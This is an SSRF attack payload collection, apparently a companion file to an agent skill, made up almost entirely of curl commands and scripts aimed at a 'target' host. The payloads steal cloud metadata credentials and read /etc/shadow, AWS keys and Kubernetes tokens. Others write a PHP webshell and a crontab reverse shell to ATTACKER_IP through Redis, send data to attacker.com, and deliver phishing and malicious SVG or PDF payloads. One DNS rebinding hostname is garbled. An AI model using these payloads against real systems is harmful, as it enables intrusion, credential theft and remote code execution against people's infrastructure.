# SSRF Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all SSRF attack payloads organized by category.

---

## 1. SSRF Detection (Basic Probes)

Test whether the application accepts internal IP addresses as URL parameters.

```bash
# Local loopback addresses - basic detection
curl "http://target/fetch?url=http://127.0.0.1:8080/admin"
curl "http://target/fetch?url=http://localhost/server-status"
curl "http://target/fetch?url=http://localhost:80/"
curl "http://target/fetch?url=http://[::1]:80/"
curl "http://target/fetch?url=http://0.0.0.0:80/"

# Local file read - file protocol
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///proc/self/environ"
curl "http://target/fetch?url=file:///etc/hosts"
curl "http://target/fetch?url=file:///proc/self/cmdline"
```

---

## 2. Protocol Scheme Abuse

Exploit non-HTTP protocols to access internal services or read local files.

### file:// Protocol - Local File Read

```bash
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///etc/shadow"
curl "http://target/fetch?url=file:///var/log/apache2/access.log"
curl "http://target/fetch?url=file:///proc/self/environ"
curl "http://target/fetch?url=file:///proc/net/tcp"
curl "http://target/fetch?url=file:///proc/net/arp"
```

### gopher:// Protocol - Arbitrary TCP Data Transmission

```bash
# Redis - INFO command
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_INFO"

# Redis - Write webshell (full chain)
# Use Gopherus to generate payload:
python3 gopherus.py --exploit redis
# Manual construction:
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SET%20payload%20%3C%3Fphp%20system(%24_GET%5Bcmd%5D)%3B%3F%3E"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SAVE"

# MySQL - Construct protocol packets
python3 gopherus.py --exploit mysql

# FastCGI - Execute arbitrary code
python3 gopherus.py --exploit fastcgi

# SMTP - Send email
curl "http://target/fetch?url=gopher://127.0.0.1:25/_HELO%20attacker.com%250AMAIL%20FROM%3Aattacker%40example.com%250ARCPT%20TO%3Avictim%40example.com%250ADATA%250ASubject%3A%20SSRF%250ATest%250A.%250AQUIT"
```

### dict:// Protocol - Dictionary Protocol Commands

```bash
curl "http://target/fetch?url=dict://127.0.0.1:6379/INFO"
curl "http://target/fetch?url=dict://127.0.0.1:6379/CONFIG%20GET%20dir"
curl "http://target/fetch?url=dict://127.0.0.1:11211/stats"
curl "http://target/fetch?url=dict://127.0.0.1:11211/stats%20slabs"
```

### ldap:// Protocol - LDAP Queries

```bash
curl "http://target/fetch?url=ldap://127.0.0.1:389/"
curl "http://target/fetch?url=ldap://127.0.0.1:389/dc=example,dc=com"
```

---

## 3. Internal Service Scanning

Probe internal network ports and services through SSRF.

```bash
# Scan common internal network ranges
# 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

# Manual probing of common ports
curl "http://target/fetch?url=http://192.168.1.1:22/"
curl "http://target/fetch?url=http://192.168.1.1:3306/"
curl "http://target/fetch?url=http://192.168.1.1:5432/"
curl "http://target/fetch?url=http://192.168.1.1:6379/"
curl "http://target/fetch?url=http://192.168.1.1:8080/"
curl "http://target/fetch?url=http://192.168.1.1:9200/"
curl "http://target/fetch?url=http://192.168.1.1:27017/"

# Batch scanning with ffuf
ffuf -u "http://target/fetch?url=http://192.168.1.FUZZ:8080/" \
  -w num.txt -mc all -fc 500 -t 50

# Port scanning with ffuf
ffuf -u "http://target/fetch?url=http://192.168.1.1:FUZZ/" \
  -w ports.txt -mc all -fc 500 -t 50

# Blind SSRF - Determine open ports by response time
# Open ports typically respond faster or return different status codes
time curl "http://target/fetch?url=http://192.168.1.1:6379/"
time curl "http://target/fetch?url=http://192.168.1.1:9999/"
```

---

## 4. Cloud Metadata (AWS / GCP / Azure)

Access cloud instance metadata endpoints through SSRF to obtain credentials and configurations.

### AWS EC2 Metadata

```bash
# IMDSv1 (enabled by default, no extra headers required)
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
curl "http://target/fetch?url=http://169.254.169.254/latest/user-data/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/hostname"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4"
curl "http://target/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"

# IMDSv2 (requires PUT request to obtain token, SSRF usually cannot exploit directly)
# But if the application supports custom HTTP methods or header injection:
# 1. PUT http://169.254.169.254/latest/api/token -> obtain token
# 2. GET http://169.254.169.254/latest/meta-data/ + X-aws-ec2-metadata-token: <token>
```

### GCP Metadata

```bash
# GCP requires Metadata-Flavor: Google header
# But some SSRF scenarios allow direct access
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Access via IP address
curl "http://target/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

### Azure Metadata

```bash
# Azure requires Metadata: true header
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl "http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
```

### Cloud Metadata IP Obfuscation Bypass

```bash
# Hexadecimal
curl "http://target/fetch?url=http://0xa9.0xfe.0xa9.0xfe/"

# Decimal
curl "http://target/fetch?url=http://2852039166/"

# Octal
curl "http://target/fetch?url=http://0251.0376.0251.0376/"

# IPv6 mapped (supported in some environments)
curl "http://target/fetch?url=http://[0:0:0:0:0:ffff:a9fe:a9fe]/"
```

---

## 5. URL Parser Bypass

Exploit URL parser differences to bypass domain/IP filtering.

### @ Symbol Spoofing

```bash
# Authentication portion is ignored, actual request goes to the address after @
curl "http://target/fetch?url=http://allowed-domain.com@127.0.0.1:8080/admin"
curl "http://target/fetch?url=http://allowed-domain.com@169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://user:pass@127.0.0.1:8080/admin"
```

### # Fragment Spoofing

```bash
# The part after # is not sent as part of the request
curl "http://target/fetch?url=http://169.254.169.254%23.allowed.com/"
```

### URL Encoding Bypass

```bash
curl "http://target/fetch?url=http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/"
curl "http://target/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"
```

### Open Redirect Exploitation

```bash
# Leverage the target's own legitimate 302 redirect to internal addresses
curl "http://target/fetch?url=http://target.com/redirect?next=http://169.254.169.254/"
curl "http://target/fetch?url=http://target.com/redirect?url=http://127.0.0.1:8080/admin"
# Leverage external trusted domain's open redirect
curl "http://target/fetch?url=http://trusted-site.com/redirect?to=http://127.0.0.1/"
```

### URL Parsing Differences

```bash
# Short-form localhost
curl "http://target/fetch?url=http://127.1:8080/"

# Backslash instead of forward slash (accepted by some parsers)
curl "http://target/fetch?url=http://127.0.0.1:8080\\@allowed.com/"

# Nested encoding
curl "http://target/fetch?url=http://127.0.0.1:8080/%2561dmin"
```

---

## 6. IP Representation Bypass

Use different IP representations to bypass IP-based filtering rules.

### Hexadecimal

```bash
curl "http://target/fetch?url=http://0x7f000001:8080/"         # 127.0.0.1
curl "http://target/fetch?url=http://0xa9fea9fe/"               # 169.254.169.254
curl "http://target/fetch?url=http://0x0a000001/"               # 10.0.0.1
curl "http://target/fetch?url=http://0x7f.0x00.0x00.0x01:8080/" # 127.0.0.1 (segmented hex)
```

### Decimal

```bash
curl "http://target/fetch?url=http://2130706433:8080/"          # 127.0.0.1
curl "http://target/fetch?url=http://2852039166/"               # 169.254.169.254
curl "http://target/fetch?url=http://167772161/"                # 10.0.0.1
```

### Octal

```bash
curl "http://target/fetch?url=http://0177.0.0.1:8080/"          # 127.0.0.1
curl "http://target/fetch?url=http://0251.0376.0251.0376/"      # 169.254.169.254
curl "http://target/fetch?url=http://012.0.0.1/"                # 10.0.0.1
```

### IPv6 Loopback

```bash
curl "http://target/fetch?url=http://[::1]:8080/"               # IPv6 localhost
curl "http://target/fetch?url=http://[::ffff:127.0.0.1]:8080/"  # IPv6 mapped
curl "http://target/fetch?url=http://[0:0:0:0:0:ffff:7f00:1]:8080/"
```

### All-Zeros Address

```bash
curl "http://target/fetch?url=http://0.0.0.0:8080/"             # All zeros (resolves to localhost on some systems)
```

### Mixed Representation

```bash
curl "http://target/fetch?url=http://0x7f.0.0.1:8080/"          # Mixed hex and decimal
curl "http://target/fetch?url=http://0177.0.0.0x1:8080/"        # Mixed octal and hex
```

---

## 7. DNS Rebinding

The first DNS resolution returns a public IP (passes validation), the second resolution returns an internal IP (actual request target).

```bash
# Use online DNS rebinding tools
# https://lock.cmpxchg8b.com/rebinder.html
# https://1u.ms/
# https://ssrf.tp0.fr/

# Principle:
# 1. Configure domain A record with TTL=0
# 2. DNS server alternates: public IP <-> internal IP
# 3. Application's first DNS query gets public IP -> validation passes
# 4. Application's second DNS query (actual request) gets internal IP -> bypass

# Using example domain (configure your own)
curl "http://target/fetch?url=http://rebind.attacker.com/latest/meta-data/iam/security-credentials/"

# Using 1u.ms service
curl "http://target/fetch?url=http://make-127.0.0.1-rebind.1u.ms/"
```

---

## 8. Blind SSRF (OOB Callback)

The application does not return SSRF response content; detect the vulnerability through external callbacks.

```bash
# Burp Suite Collaborator
# Inject Collaborator address and observe DNS/HTTP callbacks
curl "http://target/fetch?url=http://BURP_COLLABORATOR_DOMAIN/"

# Using interactsh (ProjectDiscovery)
# Start interactsh-client
interactsh-client
# Inject the generated callback address
curl "http://target/fetch?url=http://GENERATED_INTERACTSH_DOMAIN/"

# Using public callback services
curl "http://target/fetch?url=http://webhook.site/YOUR_UNIQUE_ID/"
curl "http://target/fetch?url=http://pingb.in/YOUR_UNIQUE_ID/"

# Blind SSRF + data exfiltration
# Exfiltrate data via DNS queries
curl "http://target/fetch?url=http://$(cat /etc/hostname).attacker.com/"
# Exfiltrate data via HTTP callback
curl "http://target/fetch?url=http://attacker.com/collect?data=$(cat /etc/passwd | base64)"
```

---

## 9. SSRF to Remote Code Execution

Escalate SSRF to remote code execution through chained attacks.

### SSRF + Redis Unauthorized Webshell Write

```bash
# Use Gopherus to generate complete payload
python3 gopherus.py --exploit redis

# Manual steps:
# 1. Set write directory
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html"
# 2. Set filename
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php"
# 3. Write payload
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SET%20x%20%22%3C%3Fphp%20system(%24_GET%5Bcmd%5D)%3B%3F%3E%22"
# 4. Save
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SAVE"
# 5. Access webshell
curl "http://target/shell.php?cmd=id"
```

### SSRF + Redis Write Crontab Reverse Shell

```bash
# Set crontab directory
# Use Gopherus to generate payload
python3 gopherus.py --exploit redis --crontab

# Manual steps:
# 1. CONFIG SET dir /var/spool/cron
# 2. CONFIG SET dbfilename root
# 3. SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n\n"
# 4. SAVE
```

### SSRF + Redis Write SSH Public Key

```bash
# 1. CONFIG SET dir /root/.ssh
# 2. CONFIG SET dbfilename authorized_keys
# 3. SET x "\n\nssh-rsa AAAA... attacker@kali\n\n"
# 4. SAVE
```

### SSRF + MySQL Execute SQL

```bash
# Use Gopherus to generate MySQL protocol payload
python3 gopherus.py --exploit mysql
# Requires MySQL with no password or known password
```

### SSRF + FastCGI Execute Arbitrary Code

```bash
# Use Gopherus to generate FastCGI payload
python3 gopherus.py --exploit fastcgi
# Exploit PHP-FPM to execute arbitrary code
```

### SSRF + AWS IAM Lateral Movement

```bash
# 1. Obtain IAM temporary credentials via SSRF
# http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# 2. Configure AWS CLI
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalrXU...
aws configure set aws_session_token FwoGZXI...
# 3. Enumerate and exploit cloud resources
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
```

---

## 10. Protocol Smuggling

### Gopher Protocol Exploitation

```bash
# Gopher to internal SMTP (send phishing email via SSRF)
curl "http://target/fetch?url=gopher://127.0.0.1:25/_EHLO%20attacker.com%0d%0aMAIL%20FROM%3A%3Cadmin%40target.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aSubject%3A%20Password%20Reset%0d%0a%0d%0aClick%20here%3A%20http%3A%2F%2Fattacker.com%2Fphish%0d%0a.%0d%0aQUIT"

# Gopher to internal Memcached (poison cache)
curl "http://target/fetch?url=gopher://127.0.0.1:11211/_set%20admin_session%200%20900%2012%0d%0aadmin%3Dtrue%0d%0a"

# Gopher to internal Zabbix agent (execute command)
curl "http://target/fetch?url=gopher://127.0.0.1:10050/_system.run%5Bid%5D"

# Gopher to PostgreSQL (execute query via startup message)
python3 -c "
import urllib.parse
# Construct PostgreSQL startup message
payload = '\x00\x00\x00\x50\x00\x03\x00\x00user\x00postgres\x00database\x00template1\x00\x00'
encoded = urllib.parse.quote(payload)
print(f'gopher://127.0.0.1:5432/_{encoded}')
"
```

### Dict Protocol Service Enumeration

```bash
# Dict protocol to enumerate Redis configuration
curl "http://target/fetch?url=dict://127.0.0.1:6379/CONFIG%20GET%20*"

# Dict protocol to check Memcached version
curl "http://target/fetch?url=dict://127.0.0.1:11211/version"

# Dict protocol to enumerate Memcached stats
curl "http://target/fetch?url=dict://127.0.0.1:11211/stats%20items"

# Dict protocol to dump Memcached keys
curl "http://target/fetch?url=dict://127.0.0.1:11211/stats%20cachedump%201%20100"

# Dict protocol to probe SSH banner
curl "http://target/fetch?url=dict://127.0.0.1:22/info"
```

### File Protocol Advanced Exploitation

```bash
# Read AWS credentials file
curl "http://target/fetch?url=file:///home/ubuntu/.aws/credentials"

# Read Docker socket info
curl "http://target/fetch?url=file:///var/run/docker.sock"

# Read Kubernetes service account token
curl "http://target/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"

# Read application configuration with secrets
curl "http://target/fetch?url=file:///app/config/database.yml"
curl "http://target/fetch?url=file:///app/.env"

# Read /proc for internal network info
curl "http://target/fetch?url=file:///proc/net/fib_trie"
curl "http://target/fetch?url=file:///proc/net/if_inet6"
```

### TFTP and FTP Protocol Abuse

```bash
# TFTP protocol (UDP-based, some SSRF libraries support it)
curl "http://target/fetch?url=tftp://127.0.0.1:69/etc/passwd"

# FTP protocol for port scanning (FTP bounce)
curl "http://target/fetch?url=ftp://127.0.0.1:21/"

# FTP active mode to scan internal ports
curl "http://target/fetch?url=ftp://attacker-ftp-server/file.txt"
# Configure attacker FTP to respond with PORT command targeting internal host
```

---

## 11. DNS Rebinding Attacks

### Time-Based DNS Rebinding

```python
"""
DNS Rebinding attack: First resolution returns attacker IP (passes validation),
second resolution returns internal IP (actual request hits internal service).
Requires: DNS server with TTL=0 that alternates responses.
"""
import socket
import time
import requests

def dns_rebinding_exploit(target_url, rebind_domain, internal_target):
    """
    target_url: vulnerable endpoint that fetches URLs
    rebind_domain: attacker-controlled domain with TTL=0
    internal_target: internal IP to access (e.g., 169.254.169.254)
    """
    # Step 1: Configure DNS to return attacker IP first
    # Step 2: Submit URL to target (validation resolves to attacker IP -> passes)
    # Step 3: DNS now returns internal IP
    # Step 4: Target makes actual request -> hits internal service

    payload = f"http://{rebind_domain}/latest/meta-data/"
    resp = requests.get(target_url, params={"url": payload})
    return resp.text
```

### DNS Rebinding Service Setup

```bash
# Using rbndr.us service (public DNS rebinding tool)
# Format: <first-ip>.<second-ip>.rbndr.us
# First query returns first-ip, subsequent queries return second-ip
curl "http://target/fetch?url=http://7f000001.a]9fea9fe.rbndr.us/"
# Resolves to 127.0.0.1 then 169.254.169.254

# Using 1u.ms service
curl "http://target/fetch?url=http://make-169.254.169.254-rebind-127.0.0.1.1u.ms/"

# Custom DNS rebinding server with dnsrebind tool
# On attacker DNS server:
python3 dns_rebind_server.py --first-ip 1.2.3.4 --second-ip 169.254.169.254 --domain rebind.attacker.com

# Trigger the rebinding
curl "http://target/fetch?url=http://rebind.attacker.com/latest/meta-data/iam/security-credentials/"
```

### DNS Pinning Bypass Techniques

```bash
# Bypass DNS pinning with multiple A records
# Configure DNS to return both public and internal IPs
# Some resolvers will try the second IP if first fails
dig +short multi-a.attacker.com
# Returns: 1.2.3.4 (public) AND 127.0.0.1 (internal)

# Race condition: rapid requests during TTL window
for i in $(seq 1 100); do
  curl -s "http://target/fetch?url=http://race.attacker.com:8080/admin" &
done
wait

# DNS rebinding with WebSocket (maintains connection across rebind)
# WebSocket connections persist after DNS change
python3 -c "
import websocket
ws = websocket.create_connection('ws://rebind.attacker.com/ws')
# After DNS rebinds, WebSocket still connected to internal host
ws.send('GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n')
print(ws.recv())
"
```

### Singularity of Origin (Advanced DNS Rebinding)

```bash
# Using Singularity framework for automated DNS rebinding
# https://github.com/nccgroup/singularity

# Start Singularity DNS server
cd singularity
sudo node server.js --target 169.254.169.254 --port 80

# The framework handles:
# 1. Serving attacker page on first DNS resolution
# 2. Rebinding DNS to target internal IP
# 3. JavaScript on page makes requests to internal service
# 4. Same-origin policy bypassed due to DNS rebind

# Automated attack against metadata service
curl "http://target/fetch?url=http://attacker-singularity.com/attack?target=169.254.169.254&port=80&path=/latest/meta-data/"
```

---

## 12. Cloud Metadata Exploitation

### AWS IMDSv1 Full Exploitation Chain

```bash
# Step 1: Enumerate available IAM roles
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 2: Get temporary credentials for discovered role
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role"

# Step 3: Get instance identity document (region, account ID)
curl "http://target/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"

# Step 4: Get user-data (often contains secrets, startup scripts)
curl "http://target/fetch?url=http://169.254.169.254/latest/user-data/"

# Step 5: Enumerate network interfaces and security groups
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/"

# Step 6: Get VPC and subnet information
MACADDR=$(curl -s "http://target/fetch?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/" | head -1)
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/${MACADDR}/vpc-id"
```

### AWS IMDSv2 Bypass Techniques

```bash
# IMDSv2 requires PUT request with hop limit header
# Direct SSRF usually cannot set custom methods/headers, but:

# Technique 1: Header injection via CRLF in URL
curl "http://target/fetch?url=http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0aPUT"

# Technique 2: If application allows custom HTTP method
curl -X PUT "http://target/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Technique 3: SSRF via server that follows redirects with method preservation
# Set up redirect: attacker.com/redirect -> PUT 169.254.169.254/latest/api/token

# Technique 4: Container credential endpoint (ECS)
curl "http://target/fetch?url=http://169.254.170.2/v2/credentials/"
# ECS task role credentials don't require IMDSv2 token
```

### GCP Metadata Full Exploitation

```bash
# GCP metadata requires Metadata-Flavor: Google header
# But some SSRF scenarios allow header injection

# Access token for default service account
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# List available scopes
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"

# Get project-level SSH keys
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Get custom metadata (often contains secrets)
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/"

# Get kube-env (Kubernetes cluster credentials)
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
```

### Azure IMDS and Managed Identity Exploitation

```bash
# Azure Instance Metadata Service
curl "http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get managed identity access token for Azure Resource Manager
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get token for Azure Storage
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Get token for Azure Key Vault
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Get token for Microsoft Graph API
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
```

---

## 13. SSRF via PDF Generation

### wkhtmltopdf Exploitation

```bash
# wkhtmltopdf renders HTML to PDF - if user input reaches HTML, SSRF possible
# Inject iframe/img/link pointing to internal resources

# Basic SSRF via iframe in PDF content
curl -X POST http://target/generate-pdf -d 'html=<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>'

# SSRF via img tag (image will be fetched server-side)
curl -X POST http://target/generate-pdf -d 'html=<img src="http://169.254.169.254/latest/user-data/">'

# SSRF via CSS import
curl -X POST http://target/generate-pdf -d 'html=<style>@import url("http://169.254.169.254/latest/meta-data/iam/security-credentials/");</style>'

# SSRF via link tag
curl -X POST http://target/generate-pdf -d 'html=<link rel="stylesheet" href="http://internal-service:8080/admin">'

# Local file read via wkhtmltopdf
curl -X POST http://target/generate-pdf -d 'html=<iframe src="file:///etc/passwd" width="800" height="600"></iframe>'
```

### Puppeteer/Headless Chrome SSRF

```bash
# Puppeteer renders pages server-side - inject URLs for SSRF
# If user controls the URL being rendered:
curl "http://target/screenshot?url=http://169.254.169.254/latest/meta-data/"

# JavaScript-based SSRF in rendered page
curl -X POST http://target/render -d 'html=<script>
  fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    .then(r => r.text())
    .then(d => { document.body.innerText = d; });
</script>'

# Redirect-based SSRF (page redirects to internal URL)
curl "http://target/screenshot?url=http://attacker.com/redirect-to-metadata"

# WebSocket SSRF via Puppeteer
curl -X POST http://target/render -d 'html=<script>
  var ws = new WebSocket("ws://internal-service:8080/");
  ws.onmessage = function(e) { document.title = e.data; };
</script>'
```

### Server-Side Rendering (SSR) SSRF

```bash
# Next.js/Nuxt.js SSR - if user input reaches getServerSideProps
# Inject URLs in parameters that trigger server-side fetch
curl "http://target/page?apiUrl=http://169.254.169.254/latest/meta-data/"

# React SSR with user-controlled data fetching
curl "http://target/render?endpoint=http://internal-service:3000/admin/users"

# PDF generation via Chromium-based services (Gotenberg, etc.)
curl -X POST http://target/convert/html -F 'files=@payload.html' \
  -F 'payload.html=<html><body><script>
    var x = new XMLHttpRequest();
    x.open("GET", "http://169.254.169.254/latest/meta-data/", false);
    x.send();
    document.write(x.responseText);
  </script></body></html>'
```

### PDF Library Exploitation (ReportLab, TCPDF, etc.)

```python
"""
SSRF via PDF libraries that support external resource loading.
Many PDF generators fetch images/stylesheets from URLs.
"""
# Payload for ReportLab (Python PDF library)
# If user input reaches image URL parameter:
payload_html = '''
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" />
<link rel="stylesheet" href="http://internal:8080/admin" />
'''

# Payload for TCPDF (PHP PDF library)
# TCPDF fetches images via URL
payload_tcpdf = '<img src="http://169.254.169.254/latest/user-data/" width="1" height="1" />'

# Payload for WeasyPrint (Python PDF library)
# WeasyPrint follows CSS @import and url() directives
payload_weasy = '''
<style>
  body { background: url("http://169.254.169.254/latest/meta-data/"); }
  @import url("http://internal-service:9200/_cat/indices");
</style>
<p>Report content</p>
'''

# Payload for Prince XML
payload_prince = '''
<html>
<head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head>
<body><img src="http://internal:6379/INFO" /></body>
</html>
'''
```

### SSRF via SVG Processing

```bash
# SVG files can contain external references - upload SVG for SSRF
# Create malicious SVG
cat > ssrf.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text x="10" y="20">&xxe;</text>
  <image xlink:href="http://169.254.169.254/latest/user-data/" width="100" height="100"/>
</svg>
EOF

# Upload SVG to image processing endpoint
curl -X POST http://target/upload -F "file=@ssrf.svg" -F "type=image/svg+xml"

# SVG with foreignObject for HTML rendering
cat > ssrf2.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600"></iframe>
    </body>
  </foreignObject>
</svg>
EOF
```
